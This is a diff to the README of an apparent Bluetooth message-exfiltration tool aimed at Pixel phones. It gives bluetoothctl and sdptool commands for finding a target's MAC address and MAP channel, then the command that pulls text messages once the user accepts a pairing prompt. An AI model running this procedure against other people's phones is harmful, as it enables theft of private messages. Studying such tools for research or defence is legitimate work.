@@ -72,15 +72,25 @@ cargo build --release
 
 Important: The PIXEL_MAC address refers to the phone's Bluetooth MAC address. In order to find this, make sure Bluetooth is enabled on the phone, then run `bluetoothctl` on your computer and enter `scan on`. Wait for the phone to appear in the scan output (e.g. `Device XX:XX:XX:XX:XX:XX Pixel 9a`) and copy its MAC address. Then enter `scan off` and `exit` to leave bluetoothctl.
 
-Extract the MAP channel for the target device. (Note: at this time the channel is 5):
+Extract the MAP channel for the target device. (Note: at this time the channel is 5.):
 
 ```bash
 MAP_CHANNEL=$(sdptool -i hci0 browse [PIXEL_MAC] | grep -A 8 "0x1132" | grep -oP "Channel: \K[0-9]+")
 echo "MAP Channel: $MAP_CHANNEL"
 ```
+<img width="1897" height="67" alt="image" src="https://github.com/user-attachments/assets/61657ca0-7579-48c0-af7f-9955128e88be" />
 
-Run the exfiltration tool (this triggers a pairing pop-up on the target — the
-user must allow message access, after which text-message data is extracted):
+
+Optionally, If the command above comes back empty, dump the target's full SDP record list and read the channel by hand. You will need to find the profile that says something like 'Message Access - MAS,' 'SMS/MMS,' or 'MAP.' Additionally, a profile that displays the uuid of 0x1132 will be the profile you are looking for. The RFCOMM channel is the number you are looking for. In this case, it once again is 5.
+
+<img width="477" height="269" alt="image" src="https://github.com/user-attachments/assets/e09a2adc-725c-4cab-8396-7320c93ed7fd" />
+
+
+```bash
+sdptool -i hci0 browse [PIXEL_MAC]
+```
+
+Now that you have the MAP channel and the MAC address, run the exfiltration tool (this triggers a pairing pop-up on the target — the user must allow message access, after which text-message data is extracted):
 
 ```bash
 ./target/release/obex-map-get [PIXEL_MAC] [MAP_CHANNEL] --repeat=1 --preview-body=512
